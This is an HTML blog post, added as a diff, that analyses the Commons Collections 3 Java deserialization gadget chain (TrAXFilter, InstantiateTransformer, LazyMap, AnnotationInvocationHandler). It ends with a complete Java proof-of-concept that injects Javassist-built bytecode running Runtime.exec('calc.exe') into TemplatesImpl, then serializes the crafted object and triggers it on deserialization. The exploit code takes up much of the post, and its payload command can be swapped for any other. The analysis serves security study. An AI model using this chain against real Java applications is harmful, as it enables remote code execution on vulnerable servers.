@@ -1,0 +1,347 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【Java反序列化】CommonCollections3利用链 | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1663148874314">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【Java反序列化】CommonCollections3利用链 | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="调用链
+ ObjectInputStream.readObject()
+    AnnotationInvocationHandler.readObject()
+        Map(Proxy).entrySet()
+         ..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1663148874314" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【Java反序列化】CommonCollections3利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-03
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="调用链">调用链</h2>
+<pre><code> ObjectInputStream.readObject()
+    AnnotationInvocationHandler.readObject()
+        Map(Proxy).entrySet()
+            AnnotationInvocationHandler.invoke()
+                LazyMap.get()
+                    ChainedTransformer.transform()
+                        ConstantTransformer.transform()
+                        InstantiateTransformer.transform()
+                            new TrAXFilter()
+                                TemplatesImpl.newInstance()
+                                    ... template gadge
+</code></pre>
+<h2 id="与cc2的区别">与CC2的区别</h2>
+<p>CC2使用的<code>PriorityQueue</code>作为序列化的入口，并且用的是<code>InvokerTransformer+TransformingComparator</code>作为链接命令执行的中间桥梁。<br>
+而CC3中间连接命令采用<code>TrAXFilter+ChainedTransformer+InstantiateTransformer</code>，入口点和CC1的相似。</p>
+<h2 id="利用链分析">利用链分析</h2>
+<p><code>TemplatesImpl.newInstance()</code>往下到加载恶意类的方法同CC2，不再赘诉。在调用<code>newTransformer()</code>方面，CC3引入<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>的<code>TrAXFilter</code>类。<br>
+该类的构造方法中调用了<code>TransformerImpl</code>的<code>newTransformer()</code></p>
+<pre><code class="language-java">    public TrAXFilter(Templates templates)  throws
+        TransformerConfigurationException
+    {
+        _templates = templates;
+        _transformer = (TransformerImpl) templates.newTransformer();
+        _transformerHandler = new TransformerHandlerImpl(_transformer);
+        _useServicesMechanism = _transformer.useServicesMechnism();
+    }
+</code></pre>
+<p>由于<code>TrAXFilter</code>类没有继承序列化接口，因此无法完成序列化操作。此时可以回想CC1在面对Runtime类无法序列化的解决办法，可以利通过<code>ConstantTransformer</code>类的<code>transform</code>方法获取一个对象类型然后再反射调用即可。但是这里为了在某些场景下突破对InvokerTransformer的限制，采用了一个类似的类—— InstantiateTransformer类.<br>
+InstantiateTransformer类的构造方法传入要反射调用的方法的参数类型和参数值：</p>
+<pre><code class="language-java">    public InstantiateTransformer(Class[] paramTypes, Object[] args) {
+        super();
+        iParamTypes = paramTypes;
+        iArgs = args;
+    }
+</code></pre>
+<p>随后在<code>transform()</code>中调用<code>getConstructor()</code>来调用我们希望调用的类的构造方法。</p>
+<pre><code class="language-java">    public Object transform(Object input) {
+        try {
+            if (input instanceof Class == false) {
+                throw new FunctorException(
+                    &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;
+                        + (input == null ? &quot;null object&quot; : input.getClass().getName()));
+            }
+            Constructor con = ((Class) input).getConstructor(iParamTypes);
+            return con.newInstance(iArgs);
+
+        } catch (NoSuchMethodException ex) {
+                ......（无关代码省略）
+        }
+    }
+</code></pre>
+<p>最后再用<code>ChainedTransformer</code>将其串起来，得到如下代码：</p>
+<pre><code class="language-java">        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[]{Templates.class},
+                        new Object[]{templates}
+                )
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+</code></pre>
+<p>余下的部分同CC1的LazyMap部分，也不再赘诉。</p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonCollections3 {
+    public static void main(String[] args) throws Exception {
+        //获取默认类池
+        ClassPool pool = ClassPool.getDefault();
+        //添加路径
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        //创建新类
+        CtClass evil = pool.makeClass(&quot;Evil&quot;);
+        //设置类名
+        evil.setName(&quot;MyEvil&quot;);
+        //设置要继承的类
+        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        //创建空的构造函数
+        CtConstructor newconstructor = evil.makeClassInitializer();
+        //将字节码插入开头
+        newconstructor.insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);
+        evil.writeFile();
+
+        byte[] bytecode = evil.toBytecode();
+        byte[][] bytecodes = {bytecode};
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+
+        Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[]{Templates.class},
+                        new Object[]{templates}
+                )
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap innerMap = new HashMap();
+        Map outterMap = LazyMap.decorate(innerMap, chainedTransformer);
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, outterMap);
+
+        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},  invocationHandler);
+
+        Object o = constructor.newInstance(Override.class, mapProxy);
+
+//        mySeriable(o);
+        myDeseriable();
+
+    }
+
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser3.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object myDeseriable() throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser3.bin&quot;));
+        return ois.readObject();
+    }
+}
+</code></pre>
+<h2 id="参考材料">参考材料</h2>
+<p>https://www.programminghunter.com/article/30702056451/<br>
+https://blog.weik1.top/2021/03/02/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90/#CommonCollections3<br>
+https://www.anquanke.com/post/id/233393#h2-3<br>
+https://chenlvtang.top/2021/12/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC3/<br>
+https://paper.seebug.org/1656/#commons-collections3</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE">调用链</a></li>
+<li><a href="#%E4%B8%8Ecc2%E7%9A%84%E5%8C%BA%E5%88%AB">与CC2的区别</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">利用链分析</a></li>
+<li><a href="#poc">POC</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99">参考材料</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections2-li-yong-lian/">
+              <h3 class="post-title">
+                【Java反序列化】CommonCollections2利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
